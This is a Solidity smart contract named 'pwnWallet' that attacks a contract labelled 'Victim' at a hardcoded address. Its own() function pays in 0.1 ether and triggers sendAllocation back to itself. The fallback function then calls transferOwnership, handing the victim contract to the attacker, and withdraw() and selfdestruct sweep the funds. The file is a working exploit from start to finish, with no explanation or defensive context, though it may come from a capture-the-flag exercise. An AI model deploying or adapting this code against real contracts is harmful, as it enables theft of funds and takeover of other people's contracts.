pragma solidity ^0.4.16;
interface Victim { 
    function sendAllocation(address recipient) public;
    function allocate() public payable;
    function transferOwnership(address newOwner) public;
}

contract pwnWallet {
    address owner;
    uint sendAmount;
    Victim victim;
    constructor() public payable {
        owner = 0x37fc9aa88b99aed72dadad4b8b510047ea1a43c8;
        victim = Victim(0xba76cd8fe6cbb8d353c8cd3c79a6bbe2d6b83926);
    }

    modifier onlyOwner{
        require(msg.sender == owner, "msg.sender isn't the owner");
        _;
    }
    function withdraw() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }
    
    function own() public onlyOwner{     
        victim.allocate.value(0.1 ether)();
        victim.sendAllocation(address(this));
    }

    function kill() public onlyOwner{
        selfdestruct(msg.sender);
    }
    
    function() public payable {
        if (msg.sender != owner) {victim.transferOwnership(owner);}
    }
}
